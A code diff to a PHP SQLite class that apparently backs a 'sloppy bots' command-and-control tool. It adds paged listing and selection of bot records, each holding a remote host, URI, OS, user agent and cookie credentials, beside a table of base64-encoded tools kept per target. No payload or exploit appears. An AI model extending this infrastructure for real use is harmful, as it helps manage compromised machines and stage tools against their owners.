@@ -9,9 +9,13 @@ use Symfony\Component\Console\Helper\Table;
 
 class slopSqlite extends \SQLite3
 {
+    private array $bot_data;
+    private $currentRows;
+
     public function __construct(string $filename, int $flags = SQLITE3_OPEN_READWRITE | SQLITE3_OPEN_CREATE)
     {
         parent::__construct($filename, $flags);
+        $this->bot_data = [];
     }
     public static function escapeString(string $string): string
     {
@@ -122,7 +126,6 @@ class slopSqlite extends \SQLite3
         $stmt->bindValue(':is_encrypted', $data['is_encrypted']);
         return $stmt->execute() !== false;
     }
-
     private function insertTool(array $data): bool
     {
         $stmt = $this->prepare("INSERT INTO sloppy_bots_tools(tool_name, target, base64_encoded_tool, lang, is_encrypted) VALUES(:tool_name, :target, :base64_encoded_tool, :lang, :is_encrypted);");
@@ -133,27 +136,46 @@ class slopSqlite extends \SQLite3
         $stmt->bindValue(':is_encrypted', $data['is_encrypted']);
         return $stmt->execute();
     }
-    private function grabAndFormatOutput()
+    public function grabAndFormatOutput(int $lastId = 0, int $itemsPerPage = 20)
     {
-        $res = $this->query('SELECT id, proto, rhost, uri, uuid, os_flavor, agent, cname, cvalue FROM sloppy_bots_main');
-        $rows = [];
-        while ($row = $res->fetchArray(SQLITE3_ASSOC)) $rows[] = $row;
-        $output = new ConsoleOutput();
-        $table = new Table($output);
-        $table->setHeaders(array_keys($rows[0]));
-        $table->setRows($rows);
-        $table->render();
+        $query = sprintf(
+            'SELECT id, proto, rhost, uri, uuid, os_flavor, agent, cname, cvalue 
+        FROM sloppy_bots_main 
+        WHERE id > %s
+        ORDER BY id ASC
+        LIMIT %s',
+            $lastId,
+            $itemsPerPage
+        );
+        $res = $this->query($query);
+        if (!is_bool($res)) {
+            $rows = [];
+            while ($row = $res->fetchArray(SQLITE3_ASSOC)) $rows[] = $row;
+            if (count($rows) === 0){
+                return $lastId;
+            }
+            $lastId = end($rows)['id'];
+            $output = new ConsoleOutput();
+            $table = new Table($output);
+            $table->setHeaders(array_keys($rows[0]));
+            $table->setRows($rows);
+            $table->render();
+            return $lastId;
+        } else {
+            return $lastId;
+        }
     }
+
     private function selectBot(string $id): array{
+        echo $id.PHP_EOL;
+        $this->bot_data = [];
         $bot = $this->prepare('SELECT proto, rhost, uri, uuid, os_flavor, agent, cname, cvalue FROM sloppy_bots_main WHERE id = :bot_id');
         $bot->bindValue(':bot_id', $id);
         $r = $bot->execute();
-        $ro = [];
         while ($res = $r->fetchArray(SQLITE3_ASSOC)){
-            var_dump($res);
-            $ro[] = $res;
+            $this->bot_data[] = $res;
         }
-        return $ro;
+        return $this->bot_data;
     }
     public function slopSqlite(array $data): mixed
     {
@@ -163,11 +185,9 @@ class slopSqlite extends \SQLite3
         }
         try{
             switch (true) {
-                case str_contains($data['action'], "fetch"):
-                    $this->grabAndFormatOutput();
-                    return true;
                 case str_contains($data['action'], "grabBot"):
-                    return $this->selectBot($data['id']);
+                    $this->selectBot($data['botID']);
+                    return $this->bot_data;
                 case str_contains($data['action'], "add_press"):
                     return $this->insertPress($data);
                 case str_contains($data['action'], "add_bot"):
